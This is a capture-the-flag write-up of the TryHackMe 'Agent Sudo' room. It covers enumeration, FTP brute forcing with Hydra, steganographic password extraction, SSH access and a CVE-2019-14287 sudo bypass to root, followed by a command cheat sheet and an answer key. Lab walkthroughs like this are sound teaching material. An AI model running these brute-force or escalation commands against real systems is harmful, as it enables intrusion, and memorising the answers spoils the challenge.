# TryHackMe - Agent Sudo Write-Up

## Room Overview

This room focused on:

* Enumeration
* HTTP Header Manipulation
* FTP Access
* Steganography
* SSH Access
* Linux Privilege Escalation
* CVE Exploitation

---

# Initial Nmap Scan

Started with a service enumeration scan.

```bash
nmap -sC -sV 10.67.139.197
```

## Open Ports

| Port | Service | Version       |
| ---- | ------- | ------------- |
| 21   | FTP     | vsftpd 3.0.3  |
| 22   | SSH     | OpenSSH 7.6p1 |
| 80   | HTTP    | Apache 2.4.29 |

---

# Web Enumeration

Visited the webpage and found the following message:

```text
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R
```

This indicated that the website behavior depended on the HTTP User-Agent header.

---

# Testing User-Agent Headers

Used curl to modify the User-Agent header.

```bash
curl -A "R" http://10.67.139.197
```

The response changed and showed:

```text
What are you doing! Are you one of the 25 employees?
```

This confirmed the application was checking User-Agent values.

---

# Discovering the Correct Agent

Tested different User-Agent values.

Correct request:

```bash
curl -A "C" -L 10.67.139.197
```

Received hidden message:

```text
Attention chris,

Do you still remember our deal?
Please tell agent J about the stuff ASAP.
Also, change your password, is weak!

From,
Agent R
```

## Information Gathered

| Item             | Value         |
| ---------------- | ------------- |
| Username         | chris         |
| Additional Agent | J             |
| Password Hint    | Weak Password |

---

# FTP Brute Force

Used Hydra against FTP with the discovered username.

```bash
hydra -l chris -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt ftp://10.67.139.197 -V
```

Successfully obtained FTP credentials.

Connected to FTP:

```bash
ftp 10.67.139.197
```

---

# FTP Enumeration

Listed files:

```bash
ls
```

Files discovered:

```text
To_agentJ.txt
cute-alien.jpg
cutie.png
```

Downloaded files:

```bash
get To_agentJ.txt
get cute-alien.jpg
get cutie.png
```

---

# Reading Agent J Message

Opened the text file:

```bash
cat To_agentJ.txt
```

Contents:

```text
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory.
Your login password is somehow stored in the fake picture.

From,
Agent C
```

This strongly suggested steganography.

---

# Extracting Hidden Data from PNG

Used binwalk to extract embedded files.

```bash
binwalk -e cutie.png
```

Inside the extracted directory:

```text
8702.zip
```

---

# Extracting ZIP File

Attempted extraction:

```bash
7z x 8702.zip
```

The ZIP archive required a password.

---

# Steganography on JPG

Used stegseek against the JPG image.

```bash
stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt
```

Output:

```text
Found passphrase: Area51
```

Extracted hidden file:

```text
message.txt
```

Read the file:

```bash
cat message.txt
```

Contents:

```text
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

## Credentials Discovered

| User  | Password     |
| ----- | ------------ |
| james | hackerrules! |

---

# SSH Access

Connected through SSH:

```bash
ssh james@10.67.139.197
```

Password:

```text
hackerrules!
```

---

# User Flag

Listed files:

```bash
ls -al
```

Discovered:

```text
user_flag.txt
```

Read the flag:

```bash
cat user_flag.txt
```

---

# Privilege Escalation Enumeration

Checked sudo permissions:

```bash
sudo -l
```

Output:

```text
(ALL, !root) /bin/bash
```

This sudo configuration is vulnerable to:

```text
CVE-2019-14287
```

---

# Privilege Escalation

Used the sudo UID bypass exploit:

```bash
sudo -u#-1 /bin/bash
```

Verified root access:

```bash
whoami
```

Output:

```text
root
```

---

# Root Flag

Read the root flag:

```bash
cat /root/root.txt
```

---

# Key Concepts Learned

* Nmap Enumeration
* FTP Enumeration
* Gobuster
* HTTP User-Agent Manipulation
* Hydra Password Attacks
* FTP File Transfers
* Binwalk Extraction
* Steganography
* Stegseek
* SSH Access
* Linux Enumeration
* Sudo Misconfiguration
* CVE-2019-14287 Privilege Escalation

---

# Important Commands

## Nmap

```bash
nmap -sC -sV TARGET
```

## Gobuster

```bash
gobuster dir -u http://TARGET -w WORDLIST
```

## Curl User-Agent

```bash
curl -A "C" TARGET
```

## Hydra

```bash
hydra -l USER -P WORDLIST ftp://TARGET
```

## FTP

```bash
ftp TARGET
```

## Binwalk

```bash
binwalk -e FILE
```

## Stegseek

```bash
stegseek IMAGE.jpg rockyou.txt
```

## SSH

```bash
ssh USER@TARGET
```

## Sudo Enumeration

```bash
sudo -l
```

## Privilege Escalation

```bash
sudo -u#-1 /bin/bash
```

---

# Final Answers

| Question                                        | Answer                |
| ----------------------------------------------- | --------------------- |
| How did you redirect yourself to a secret page? | User-Agent            |
| ZIP Password                                    | alien                 |
| Steg Password                                   | Area51                |
| Incident Name                                   | Roswell alien autopsy |
| Privilege Escalation CVE                        | CVE-2019-14287        |
| Who is Agent R?                                 | DesKel                |
